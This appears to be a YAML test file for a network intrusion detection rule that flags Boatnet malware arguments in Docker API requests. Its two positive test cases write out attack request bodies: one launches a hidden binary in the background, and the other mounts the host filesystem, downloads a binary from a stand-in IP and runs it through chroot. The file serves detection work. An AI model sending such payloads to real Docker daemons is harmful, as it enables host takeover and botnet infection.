name: "Boatnet 1000262002 — Docker create/exec body carrying the Boatnet execution argument"

rule: >-
  alert http $EXTERNAL_NET any -> $HOME_NET 2375 (msg:"CYFAR MALWARE Boatnet execution argument in Docker API request body"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/containers/"; http.request_body; content:"|e5 ba 94 e7 94 a8|-docker"; fast_pattern; classtype:trojan-activity; sid:1000262002; rev:1; metadata:created_at 2026-09-25;)

tests:
  - name: "positive-exec-setsid-dk"
    expected_sids: [1000262002]
    request:
      method: POST
      uri: /containers/a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90/exec
      host: 198.51.100.10
      port: 2375
      client_ip: "1.2.3.4"
      headers:
        Content-Type: application/json
        User-Agent: Docker-Client/24.0.0
      body: >-
        {"AttachStdout":false,"AttachStderr":false,"Cmd":["sh","-c","chmod 755 /tmp/.dk; setsid /tmp/.dk 应用-docker </dev/null >/dev/null 2>&1 &"]}

  - name: "positive-create-chroot-host"
    expected_sids: [1000262002]
    request:
      method: POST
      uri: /containers/create?name=dnfxardk
      host: 198.51.100.10
      port: 2375
      client_ip: "1.2.3.4"
      headers:
        Content-Type: application/json
      body: >-
        {"Image":"alpine","Cmd":["/bin/sh","-c","wget -q -O /host/dev/shm/b1 http://192.0.2.10:8080/1; chmod 777 /host/dev/shm/b1; chroot /host /dev/shm/b1 应用-docker"],"HostConfig":{"Binds":["/:/host"]}}

  - name: "negative-benign-exec"
    expected_sids: []
    request:
      method: POST
      uri: /containers/abc123/exec
      host: 198.51.100.10
      port: 2375
      client_ip: "1.2.3.4"
      headers:
        Content-Type: application/json
      body: >-
        {"Cmd":["sh","-c","chmod 755 /tmp/app && /tmp/app --docker"]}

  - name: "negative-other-cjk-argument"
    expected_sids: []
    request:
      method: POST
      uri: /containers/create
      host: 198.51.100.10
      port: 2375
      client_ip: "1.2.3.4"
      headers:
        Content-Type: application/json
      body: >-
        {"Image":"alpine","Cmd":["echo","应用程序"]}
